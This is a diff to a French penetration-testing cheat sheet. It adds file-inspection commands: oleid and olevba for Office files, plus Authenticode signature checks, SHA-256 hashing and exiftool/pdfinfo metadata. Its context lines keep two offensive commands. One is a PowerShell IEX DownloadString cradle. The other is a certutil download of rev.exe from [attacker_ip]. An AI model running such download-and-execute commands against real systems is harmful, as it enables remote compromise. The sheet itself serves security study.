@@ -107,6 +107,18 @@ End Sub
 ```
 
 
+
+### Détecter les métadonnées OLE d'un document
+
+Oletools permet de relever les caractéristiques d'un fichier Office sans ouvrir les macros dans la suite bureautique.
+
+<p class="oscp-command-note">Détecter les métadonnées OLE d'un document.</p>
+
+```bash
+oleid <DOCUMENT_OFFICE>
+olevba -a <DOCUMENT_OFFICE>
+```
+
 ## Fichiers de bibliothèque Windows
 
 Observer les permissions et la configuration de Windows.
@@ -158,6 +170,17 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://
 
 ```
 
+
+
+### Inspecter la signature d'un exécutable
+
+Afficher l'état de la signature Authenticode d'un fichier Windows, sans le lancer.
+
+<p class="oscp-command-note">Inspecter la signature d'un exécutable.</p>
+
+```powershell
+Get-AuthenticodeSignature -FilePath '<CHEMIN_EXECUTABLE>' | Format-List
+```
 
 ## Exploitation avancée
 
@@ -676,6 +699,29 @@ cd C:\xampp\htdocs && certutil -urlcache -split -f http://[attacker_ip]/rev.exe 
 
 ```
 
+
+
+
+#### Empreinte d'une pièce jointe
+
+Conserver une empreinte SHA-256 des fichiers étudiés afin de comparer les résultats sans diffuser les originaux.
+
+<p class="oscp-command-note">Empreinte d'une pièce jointe.</p>
+
+```powershell
+Get-FileHash -Algorithm SHA256 -Path '<DOCUMENT>'
+```
+
+### Contrôler les métadonnées d'une pièce jointe
+
+Examiner les métadonnées d'un document et les informations d'un fichier PDF avant son ouverture.
+
+<p class="oscp-command-note">Contrôler les métadonnées d'une pièce jointe.</p>
+
+```bash
+exiftool <FICHIER_A_ANALYSER>
+pdfinfo <DOCUMENT>.pdf
+```
 
 ## Examiner les raccourcis Windows
 
